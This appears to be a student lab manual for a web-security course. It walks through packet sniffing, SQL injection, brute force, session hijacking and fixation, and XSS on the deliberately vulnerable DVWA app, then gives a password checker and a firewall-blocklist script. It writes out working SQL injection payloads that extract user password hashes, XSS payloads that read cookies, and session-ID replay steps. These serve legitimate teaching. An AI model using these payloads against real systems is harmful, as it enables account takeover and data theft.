Exp-1:Packet Sniffing 

Procedure:
Step 1: Open Kali Linux.
Step 2: Open Terminal in Kali Linux.
Step 3:
Start a local HTTP server on port 8080 using :
python3 -m http.server 8080
Step 4: In another new terminal start packet capture:
sudo tcpdump -i any -w capture.pcap port 8080
Step 5: Open Firefox in kali Linux and go to:
http://localhost:8080
Refresh the page to generate traffic.
Step 6:
Go back to tcpdump terminal.
Stop packet capturing by using Ctrl + C.
It will stop and show how many packets were captured
The packets are saved as capture.pcap.
Step 7:
• Click the Kali Linux dragon icon (top left).
• Type: File Manager and open it.
• Your Home folder will open.
• You will see the file: capture.pcap.
Step 8:-
• Since Wireshark is pre-installed in Kali, just double-click capture.pcap.
• The file will open directly in Wireshark for analysis.
Step 9:-
Filter Login Packets
In Wireshark filter bar, type: http.request.method == "POST"
Press Enter.
Now only important packets will show.
Step 10:-
Click on any one of the packet and the following data is displayed.
Browser details such as OS, browser version, language, and visited URLs are visible.If a form is
submitted, username and password can be seen in plain text.This proves HTTP is insecure.


Exp-2:SQL Injection 

Setting Up DVWA in Kali Linux
Step 1: Install DVWA
sudo apt update
sudo apt install dvwa –y
Step 2: Start Required Services
sudo service apache2 start
sudo service mysql start
Step 3: Configure DVWA
Edit config file:
sudo nano /etc/dvwa/config.inc.php
if error:

In newer Kali, DVWA installs at:

/usr/share/dvwa

Apache serves from:

/var/www/html

So create symbolic link:

sudo ln -s /usr/share/dvwa /var/www/html/dvwa

Restart Apache:

sudo service apache2 restart
PART 3: Configure DVWA Database (CRITICAL STEP)

This is the step that caused your error earlier.

STEP 1: Create Database & User in MySQL

Login to MySQL:

sudo mysql

Inside MySQL:

CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY '';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;

This fixes the “Access denied for user 'dvwa'@'localhost'” error.
Ensure:
$_DVWA['db_password'] = '';
Save and exit.
Step 4: Open DVWA in Browser(Firefox)
http://127.0.0.1/dvwa
 Login:
o Username: admin
o Password: password
 Click Create / Reset Database
Step 5: Set Security Level
 Go to DVWA Security
 Set Security Level = Low
 Click Submit
4. SQL Injection Attack on DVWA
Step 6: Navigate to SQL Injection Module
DVWA → Vulnerabilities → SQL Injection
You will see an input box asking for User ID.
5. Basic SQL Injection Test
Step 7: Normal Input
1
 Displays user details normally
Step 8: Authentication Bypass
Enter:
1' OR '1'='1
 Result:All user records are displayed
Confirms SQL Injection vulnerability
6. SQL Injection – Database Enumeration
Step 9: Find Number of Columns
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -
Stop when error occurs Last successful number = total columns
Step 10: UNION-Based Injection
1' UNION SELECT 1,2-- -
Step 11: Extract Database Name
1' UNION SELECT database(),2-- -
Step 12: Extract Table Names
1' UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema=database()-- -
Step 13: Extract Column Names
1' UNION SELECT column_name,2
FROM information_schema.columns
WHERE table_name='users'-- -
Step 14: Extract Username & Password
1' UNION SELECT user,password FROM users-- -
 Passwords may appear as hashes.
8. Result
The SQL Injection attack was successfully performed, demonstrating:
 Authentication bypass
 Unauthorized data access
 Poor input validation vulnerability


Exp-3:Authentication Weaknesses and Session Management

PART A: Launch DVWA
Step 1: Start Required Services
Open terminal and start Apache and MySQL:
sudo service apache2 start
sudo service mysql start
Step 2: Open DVWA in Browser
Open Firefox and enter:
http://127.0.0.1/dvwa
Step 3: Login to DVWA
Use default credentials:
Username: admin
Password: password
Step 4: Set Security Level
 Go to DVWA Security
 Select LOW
 Click Submit
PART B: Testing Authentication Weaknesses
Experiment 1: Weak Password Authentication
Step 1: Open Brute Force Module
Navigate to:
DVWA → Vulnerabilities → Brute Force
Step 2: Try Common Passwords
Enter:
Username: admin
Password: password
Observation
Successful login indicates weak authentication.

Experiment 2: Manual Brute Force Attack
Enter Username (Same Every Time)
In Username field, type:
admin
Do NOT change username.
Step 3: Try Passwords ONE BY ONE
Now you will manually try passwords (this is the “manual brute force”).
Attempt 1
 Username: admin
 Password: admin
 Click Login
❌ If it fails → try next password
Attempt 2
 Username: admin
 Password: 123456
 Click Login
❌ If it fails → try next password
Attempt 3
 Username: admin
 Password: password
 Click Login
LOGIN SUCCESSFUL
Step 4: Observe What Happened
 DVWA did NOT block you
 DVWA did NOT lock account
 DVWA allowed unlimited attempts
This is called Brute Force Vulnerability
PART C: Testing Session Management Vulnerabilities

✅ Experiment 3: Session ID Analysis
Step 1: Login to DVWA
Open browser developer tools:
Right Click → Inspect → Storage → Cookies
Step 2: Observe Session Cookie
Look for:
PHPSESSID
Observation
Session ID is visible and not encrypted.
PHPSESSID : 5f6194766020dcaa2c906358cbd2941b

Experiment 4: Session Hijacking
BEFORE YOU START (IMPORTANT)
DVWA security level = LOW
You are logged in as admin in DVWA
STEP-BY-STEP
Step 1: Open DVWA (Victim Session)
1. Open Firefox
2. Go to: http://127.0.0.1/dvwa
3. Login:
Username: admin
Password: password
4. Stay logged in (do NOT logout)
This browser is the Victim
Step 2: Copy the Session ID (PHPSESSID)
1. In the same Firefox window
2. Right click → Inspect
3. Click Storage tab
4. Click Cookies
5. Select: http://127.0.0.1
You will see something like:
PHPSESSID a8c9f7e3d4b1...
6. Right-click on PHPSESSID value → Copy
This value is the session ID (user identity).
Step 3: Open Attacker Browser (Private Window)
1. Press:
Ctrl + Shift + P
(Private Window opens)
Do NOT login here.
Step 4: Paste Session ID in Attacker Browser
1. In Private Window, go to: http://127.0.0.1/dvwa
2. Right click → Inspect
3. Go to Storage → Cookies
4. Click: http://127.0.0.1
5. Find PHPSESSID
6. Replace its value with the copied PHPSESSID (5f6194766020dcaa2c906358cbd2941b)
7. Press Enter
Step 5: Refresh Page
1. Refresh the page (F5)
You are logged in as admin without username or password!
Result
Attacker gains access without login → Session Hijacking.

Experiment 5: Session Fixation
IMPORTANT CONDITIONS (CHECK FIRST)
DVWA Security Level = LOW
Use only ONE browser window (normal window)
Do NOT use Private Window here
STEP-BY-STEP (DO EXACTLY THIS)
Step 1: Open DVWA WITHOUT Login (Attacker sets session)
1. Open Firefox
2. Go to: http://127.0.0.1/dvwa/
You will see the login page
Do NOT login
Step 2: Note the Session ID (Before Login)
1. Right click → Inspect
2. Go to Storage
3. Click Cookies
4. Select: http://127.0.0.1
You will see:
PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
Step 3: Login WITHOUT Closing Browser
Now, in the same browser window:
1. Enter:
Username: admin
Password: password
2. Click Login
Do NOT refresh, do NOT close browser
Step 4: Check Session ID AGAIN (After Login)
1. Again open:
Inspect → Storage → Cookies → http://127.0.0.1
2. Look at PHPSESSID
3.
OBSERVE CAREFULLY
Case 1 (VULNERABLE – DVWA LOW)
Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
After Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
Same value
Session Fixation exists
Case 2 (SECURE – DVWA HIGH / IMPOSSIBLE)
Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
After Login PHPSESSID = be2d584526b42fef6742d5cf95ce008f
Session regenerated
No session fixation

Experiment 6:
CONDITIONS (CHECK FIRST)
DVWA Security Level = LOW
You must know how to view cookies
STEP-BY-STEP (
Step 1: Login Normally (Victim Session)
1. Open Firefox
2. Go to: http://127.0.0.1/dvwa/
3. Login:
Username: admin
Password: password
Step 2: Copy Session ID (IMPORTANT)
1. Right click → Inspect
2. Storage → Cookies → http://127.0.0.1
3. Copy:
PHPSESSID = be2d584526b42fef6742d5cf95ce008f
Screenshot 1: PHPSESSID before logout
Step 3: Logout from DVWA
1. Click Logout (top right or menu)
2. You will see login page
Logout completed
Step 4: Reuse OLD Session ID (THIS IS THE TEST)
Option A (EASIEST & EXAM-SAFE)
1. Open Private Window
Ctrl + Shift + P
2. Go to:
http://127.0.0.1/dvwa/
3. Open Inspect → Storage → Cookies
4. Paste the OLD PHPSESSID (copied earlier)
5. Press Enter
Step 5: Open Internal Page (KEY STEP 🔑)
In address bar, type:
http://127.0.0.1/dvwa/index.php
(or)
http://127.0.0.1/dvwa/vulnerabilities/brute/
🚨 Do NOT press Login
🚨 Do NOT enter username/password
🔑 EXPECTED RESULT (DVWA LOW)
✔You are logged in again
✔ Without login
✔ Using old session ID
Logout did NOT destroy session


Exp-4:XSS Vulnerabilities

Step 1: Start DVWA Services
Open terminal:
sudo service apache2 start
sudo service mysql start
Open browser and go to:
http://localhost/dvwa
Login:
 Username: admin
 Password: password
Click DVWA Security → set level to Low → Submit.
Step 2: Understanding XSS
XSS allows attackers to inject JavaScript code into a webpage that runs in another user’s browser.
Types in DVWA:
 Reflected XSS
 Stored XSS
 DOM Based XSS
Step 3: Reflected XSS Test
Go to:
DVWA → XSS (Reflected)
In the input box, type:
<script>alert('XSS')</script>
Click Submit.
Output:
You will see a popup alert → XSS vulnerability confirmed.


Step 4: Stored XSS Test
Go to:
DVWA → XSS (Stored)
Fill the form:
Name:
<h1>Hacked</h1>
Message:
<script>alert('Stored XSS')</script>
Click Sign Guestbook.
Refresh page → popup appears every time → Stored XSS successful.

Step 5: DOM Based XSS
Go to:
DVWA → XSS (DOM)
In the URL bar add:
#<script>alert('DOM XSS')</script>
Press Enter → popup appears.
Step 6: Capture Cookie (Lab Demo)
In Stored XSS Message box:
<script>alert(document.cookie)</script>
This shows session cookies (demo of session theft).
Step 7: Change Security Level
Go to DVWA Security → set:
 Medium
 High
Repeat the same payloads → see how filtering blocks them.
Result
XSS vulnerabilities were successfully identified and exploited in DVWA. 


Exp-5: Password Strength
import re

def check_password_strength(password):
    if len(password) < 8:
        return "Weak: Password must be at least 8 characters long."

    if not any(char.isdigit() for char in password):
        return "Weak: Password must include at least one number."

    if not any(char.isupper() for char in password):
        return "Weak: Password must include at least one uppercase letter."

    if not any(char.islower() for char in password):
        return "Weak: Password must include at least one lowercase letter."

    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        return "Medium: Add special characters to make your password stronger."

    return "Strong: Your password is secure!"


def password_checker():
    print("Welcome to the Password Strength Checker!")

    while True:
        password = input("\nEnter your password (or type 'exit' to quit): ")

        if password.lower() == "exit":
            print("Thank you for using the Password Strength Checker! Goodbye!")
            break

        result = check_password_strength(password)
        print(result)


if __name__ == "__main__":
    password_checker()


Exp-6: Firewall

🔹 PART A – Manual Firewall Configuration

(Block a single IP using GUI)

Step-by-Step Procedure

Press Windows Key

Search:
Windows Defender Firewall with Advanced Security

Click Inbound Rules

Click New Rule (right side)

Select Custom → Next

Select All Programs → Next

Protocol & Ports → Keep default → Next

Scope
Under Remote IP Address → Select
These IP addresses
Click Add
Enter IP (example: 1.2.3.4)
Click OK → Next

Action → Select Block the connection → Next

Profile → Select Domain, Private, Public → Next

Name rule:
Manual_Block_IP

Click Finish

Now all traffic from that IP is blocked.

🔹 PART B – Automated Firewall Configuration (Python Script)

Instead of blocking one IP, we download a malicious IP list and block all.

From PDF 

LABExercise1_Firewall

🧠 How the Script Works

Downloads malicious IP list from:
Abuse.ch

Reads CSV file

Deletes old rule named "BadIP"

Adds new firewall rule for each IP

✅ Correct & Clean Version of firewall.py
import requests
import csv
import subprocess

# Download malicious IP list
response = requests.get(
    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
).text

# Delete old rule (if exists)
delete_rule = 'netsh advfirewall firewall delete rule name="BadIP"'
subprocess.run(["PowerShell", "-Command", delete_rule])

# Read CSV ignoring comments
mycsv = csv.reader(
    filter(lambda x: not x.startswith("#"), response.splitlines())
)

# Add firewall rule for each IP
for row in mycsv:
    ip = row[1]

    if ip != "dst_ip":
        print("Added Rule to block:", ip)

        rule = (
            "netsh advfirewall firewall add rule "
            "name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
        )

        subprocess.run(["PowerShell", "-Command", rule])
🖥 Execution Steps

Open Command Prompt
Right Click → Run as Administrator

Go to file location:

cd C:\Users\YourName\Desktop

Check Python:

python --version

Install requests (if needed):

python -m pip install requests

Run script:

python firewall.py

You will see:

Added Rule to block: 45.9.148.221
Added Rule to block: 103.17.48.5
